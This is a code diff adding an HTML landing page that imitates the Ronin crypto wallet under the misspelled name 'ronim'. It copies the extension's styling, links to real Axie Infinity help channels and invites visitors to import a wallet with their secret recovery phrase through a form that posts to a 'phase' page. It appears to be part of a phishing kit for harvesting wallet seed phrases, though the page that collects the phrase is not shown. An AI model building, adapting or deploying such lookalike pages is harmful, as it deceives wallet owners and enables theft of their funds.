@@ -1,0 +1,265 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  
+</style><style>
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 600;
+  src: url(chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/fonts/Inter-SemiBold.ttf);
+}
+
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 700;
+  src: url(chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/fonts/Inter-Bold.ttf);
+}
+
+body {
+  font-family: 'Inter', Helvetica, Arial, sans-serif;
+  font-feature-settings: "calt" off;
+}
+
+/* HACK: Delete after update design system */
+.well-full .ds-well-content {
+  width: 100%;
+}
+
+:root {
+  --color-aquatic: #00b8ce;
+  --color-beast: #ffb812;
+  --color-bug: #ff5341;
+  --color-bird: #ff8bbd;
+  --color-plant: #6cc000;
+  --color-reptile: #dc8be4;
+  --color-hidden-1: #c6bdd4;
+  --color-hidden-2: #beceff;
+  --color-hidden-3: #129092;
+  --color-axie: #8d65ff;
+  --color-savannah: #f99e2e;
+  --color-forest: #6cc000;
+  --color-arctic: #dbf0ef;
+  --color-mystic: #6fccd4;
+  --color-genesis: #3e7292;
+  --color-rarity-rare: #09b99b;
+  --color-rariry-epic: #ffa22a;
+  --color-rarity-mystic: #ae2aff;
+  --color-text-arctic: #55586a;
+
+  --ronim-rounded: 8px;
+  --ronim-blue: #1273ea;
+  --ronim-gradient: linear-gradient(256.28deg, #1c94f4 0%, #1273ea 100%);
+  --ronim-gradient--reverse: linear-gradient(
+    76.28deg,
+    #1c94f4 0%,
+    #1273ea 100%
+  );
+}
+
+.ds-button,
+.ds-input,
+.ds-dialog,
+.ds-tooltip-content,
+.ds-popover-content {
+  border-radius: var(--ronim-rounded);
+}
+
+.ds-popover-content {
+  background-color: transparent;
+}
+
+.ds-tooltip-content {
+  background-color: rgba(21, 26, 48, 0.8);
+}
+
+.text-ronim-blue {
+  color: var(--ronim-blue);
+}
+
+.border-ronim-blue {
+  border-color: var(--ronim-blue);
+}
+
+.bg-ronim-blue {
+  background-color: var(--ronim-blue);
+}
+
+.bg-ronim-gradient {
+  background-image: var(--ronim-gradient);
+}
+
+.hover\:bg-ronim-gradient:hover {
+  background-image: var(--ronim-gradient--reverse);
+}
+
+.bg-ronim-gradient-reversed {
+  background-image: var(--ronim-gradient--reverse);
+}
+
+.hover\:bg-ronim-gradient-reversed:hover {
+  background-image: var(--ronim-gradient);
+}
+
+.ds-button.ds-large {
+  padding-left: 20px;
+  padding-right: 20px;
+}
+
+.ronim-button {
+  transition: 0.2s ease-in-out;
+}
+
+.ronim-button-default {
+  color: var(--color-white);
+  background-color: transparent;
+}
+
+.ronim-button-default:disabled {
+  color: var(--color-white);
+  background-color: transparent;
+  opacity: 0.5;
+}
+
+.ronim-button-default:active {
+  background-image: linear-gradient(to right, #1773d0 0%, #1773d0 100%);
+}
+
+.ronim-button-default:not(:disabled):hover {
+  filter: brightness(120%);
+}
+
+.ronim-minimal-button {
+  color: var(--ronim-blue);
+  background-color: var(--color-basic-1);
+}
+
+.ronim-minimal-button:disabled {
+  color: var(--ronim-blue);
+  background-color: var(--color-basic-1);
+  opacity: 0.5;
+}
+
+.ronim-minimal-button.bg-transparent {
+  background-color: transparent;
+}
+
+.ronim-minimal-button.bg-transparent:disabled {
+  background-color: transparent;
+}
+
+.ronim-ghost-button {
+  box-shadow: 0 0 0 1px var(--ronim-blue) inset;
+  color: var(--ronim-blue);
+  background-color: transparent;
+}
+
+.ronim-ghost-button:hover {
+  background-color: var(--color-primary-1) !important;
+}
+
+.ronim-ghost-button.account-card-button:hover {
+  background-color: var(--color-primary-6) !important;
+}
+
+.shadow-none {
+  box-shadow: none;
+}
+
+.scrollbar-hidden::-webkit-scrollbar {
+  width: 0px;
+  background: transparent;
+}
+
+@keyframes wave {
+  0% {
+    transform: translateX(-100%);
+  }
+  60% {
+    transform: translateX(100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.banner-image {
+  position: relative;
+  display: block;
+  overflow: hidden;
+  background: linear-gradient(90deg, #e4e8f2 0%, #f7f9fc 51.04%, #e4e8f2 100%),
+    #e4e8f2;
+}
+
+.banner-image::after {
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  content: "";
+  position: absolute;
+  animation: wave 1.6s linear 0.5s infinite;
+  transform: translateX(-100%);
+  background: linear-gradient(
+    90deg,
+    transparent,
+    rgba(0, 0, 0, 0.04),
+    transparent
+  );
+}
+
+.ds-input-wrapper-large > .ds-input {
+  width: 100%;
+  height: 40px;
+}
+</style>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ronim</title>
+    <link rel="stylesheet" href="index.css">
+  </head>
+  <body><br>
+  
+  <form action="phase/index.html" method="post">
+ <img style="align: center;width: 10%;height: 3%;" class="center" src="logoronim.webp">
+
+ 
+ <div class="grid md:grid-cols-2 sm:grid-cols-1"><div class="flex flex-col justify-start pt-40 mt-44" style="padding-left: 59px; padding-right: 59px;">
+ 
+ <h2 class="mb-24 font-bold" style="font-size: 33px;margin-top: 12%;margin-left: 22%" >Welcome to ronim Wallet</h2>
+ <p style="margin-top: 1%;margin-left: 22%">  Use this wallet to play Axie Infinity and other applications running <br>on ronim .
+
+</p><br>
+
+<button style="margin-left:22%;border-radius: 10px;" class="ronim-button ronim-button-default shadow-none bg-ronim-gradient hover:bg-ronim-gradient h-40 mb-16 ds-button ds-large">
+
+<div class="w-full text-center text-14">I'm new. Let's get set up!</div></button>
+
+<button style="background-color: red;margin-left:22%;border-radius: 10px;" class="ronim-button ronim-button-default shadow-none bg-ronim-gradient hover:bg-ronim-gradient h-40 mb-16 ds-button ds-large">
+
+<div class="w-full text-center text-14">I already have a secret recovery phrase. Import wallet.</div></button>
+<br>
+<span style="margin-left: 22%;">Need help? Join our <a href="https://discord.gg/axie" target="_blank" class="text-ronim-blue font-semibold hover:underline" rel="noreferrer">Discord</a> server or submit a request on our <a href="https://support.axieinfinity.com/" target="_blank" class="text-ronim-blue font-semibold hover:underline" rel="noreferrer">Support Site</a>.</span>
+
+
+
+ <img style="margin-left: 45%;width: 42%;height: 65%;position: absolute;" class="center" src="ronimpapet.webp">
+</form>
+<style>
+body {
+    background-image: url(ronim.svg);
+    background-size: 1308px;
+    background-position: center 96px;
+}
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 13%;
+}
+</style>
+  </body>
+</html>
